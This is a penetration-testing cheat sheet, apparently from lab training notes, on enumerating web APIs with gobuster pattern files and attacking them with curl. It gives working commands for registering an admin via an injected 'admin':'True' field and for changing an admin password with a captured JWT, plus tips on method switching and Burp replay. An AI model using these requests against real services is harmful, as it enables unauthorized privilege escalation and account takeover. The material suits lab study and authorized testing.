# Checklist
- [ ] Pattern files
- [ ] Manual API Hacking
- [ ] Enumerating API's further

API paths are often followed by a version number, resulting in a pattern such as:
```
/api_name/v1
```
The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number.
# Pattern files
With this information, let's try brute forcing the API paths using a wordlist along with the pattern Gobuster feature. We can call this feature by using the -p option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```
# Manual API Hacking
## Scan for API's
To run a pattern file for enumerating API's, use the following command:
```bash
gobuster dir -u http://[Web address/ip]:[port] -w /usr/share/wordlists/dirb/big.txt -p pattern
```
To enumerate a specific API:
```bash
gobuster dir -u http:[Web address/ip]:[port] -w /usr/share/wordlists/dirb/big.txt -p pattern
```
## Enumerating API's further
* Try curl discovered API's!
```bash
curl -i http://[Web address/ip]/path/to/api
```
* Depending on results, try bruteforcing scanning other specific API's (i.e. if /users returns an admin, try bruteforcing /users/v1/admin for other API's).

Rinse and Repeat! 
## Interacting with API's
If interesting API's require data to be posted, refer to the following example:
```bash
curl -d '{"password":"fake","username":"admin", "admin":"True"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```
If a JWT auth token is received, be sure to post it as an "Authorization: Oauth" header, like in the example below:
```bash
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```
If the above command does not work, be sure to try other methods such as PUT or PATCH:
```bash
curl -X [METHOD]
```
* Using Burp instead!
* Switch on burp proxy
* Turn on intercept 
* Run a curl command to the API using the following command:
```bash
curl /path/to/api -d "{'key':'data'}" --proxy 127.0.0.1:8080
```
* Send the request to repeater
